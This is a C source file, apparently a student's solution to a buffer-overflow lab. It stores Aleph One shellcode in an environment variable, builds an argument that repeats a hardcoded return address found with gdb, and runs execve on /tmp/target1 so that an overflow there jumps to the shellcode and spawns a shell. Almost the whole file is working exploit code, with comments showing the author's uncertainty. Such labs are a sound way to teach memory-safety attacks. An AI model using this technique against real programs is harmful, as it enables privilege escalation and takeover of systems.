#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

#define BUFFER_SIZE 408

static char env_addr[] = "\xb9\xff\xff\xbf";

int main(void)
{
  char *args[3]; 
  // char buffer[BUFFER_SIZE]; // Make larger size as target program?
  char *env[2]; // Need environment variables
  
  // set an environment variable
  int success = setenv("ALEPHCODE", shellcodeAlephOne, 1);
  char* env_ptr = getenv("ALEPHCODE");
  printf("Shellcode environment variable address: %p; success: %d\n", getenv("ALEPHCODE"), success);
  printf("Env ptr: 0x%x, %p\n", env_ptr, env_ptr);

  // env_addr retrieved from running gdb and seeing where ALEPHCODE env variable lives
  // that value is hardcoded in shellcode.h
  char env_buffer[12];
  memcpy(env_buffer, env_addr, 4);
  memcpy(env_buffer+4, env_addr, 4);
  memcpy(env_buffer+8, env_addr, 4);

  args[0] = TARGET; // Must contain filename of file being executed
  args[1] = env_buffer; // overflow buffer with return address to environment variable holding shell code
  args[2] = NULL; // argv and envp arrays must each include a null pointer at end of array

  env[0] = env_ptr; // env_buffer or env_ptr?
  env[1] = NULL; // Last byte value must be null at end
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


